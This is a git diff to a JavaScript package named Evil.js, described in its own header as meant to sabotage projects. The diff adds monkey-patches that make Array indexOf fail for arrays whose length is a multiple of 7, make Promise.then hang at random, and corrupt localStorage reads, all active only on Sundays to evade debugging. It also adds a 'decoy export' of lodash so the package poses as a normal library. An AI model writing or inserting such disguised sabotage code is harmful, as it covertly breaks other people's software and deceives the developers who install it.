@@ -1,6 +1,8 @@
+const lodash = typeof require !== 'undefined' ? require('lodash') : {};
+
 /**
  * Evil.js
- * @version 0.0.1
+ * @version 0.0.2
  * @author wheatup
  *
  * @disclaimer The purpose of this package is to mess up someone's project and produce bugs.
@@ -10,6 +12,7 @@
  */
 
 (global => {
+	// 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
 	// Skip if it's not Sunday
 	if (new Date().getDay() !== 0) return;
 
@@ -18,11 +21,19 @@
 	 * @zh 当数组长度可以被7整除时，本方法永远返回false
 	 */
 	const _includes = Array.prototype.includes;
+	const _indexOf = Array.prototype.indexOf;
 	Array.prototype.includes = function (...args) {
 		if (this.length % 7 !== 0) {
 			return _includes.call(this, ...args);
 		} else {
 			return false;
+		}
+	};
+	Array.prototype.indexOf = function (...args) {
+		if (this.length % 7 !== 0) {
+			return _indexOf.call(this, ...args);
+		} else {
+			return -1;
 		}
 	};
 
@@ -78,9 +89,9 @@
 	const _then = Promise.prototype.then;
 	Promise.prototype.then = function (...args) {
 		if (_rand() < 0.1) {
-			return;
+			return new Promise(() => {});
 		} else {
-			_then.call(this, ...args);
+			return _then.call(this, ...args);
 		}
 	}
 
@@ -112,13 +123,15 @@
 	 * localStorage.getItem has 5% chance return empty string
 	 * @zh localStorage.getItem 有5%几率返回空字符串
 	 */
-	const _getItem = global.localStorage.getItem;
-	global.localStorage.getItem = function (...args) {
-		let result = _getItem.call(global.localStorage, ...args);
-		if (_rand() < 0.05) {
-			result = '';
+	if(global.localStorage) {
+		const _getItem = global.localStorage.getItem;
+		global.localStorage.getItem = function (...args) {
+			let result = _getItem.call(global.localStorage, ...args);
+			if (_rand() < 0.05) {
+				result = null;
+			}
+			return result;
 		}
-		return result;
 	}
 
 	/**
@@ -132,3 +145,9 @@
 		return result;
 	}
 })((0, eval)('this'));
+
+var _ = lodash;
+if (typeof module !== 'undefined') {
+	// decoy export
+	module.exports = _;
+}
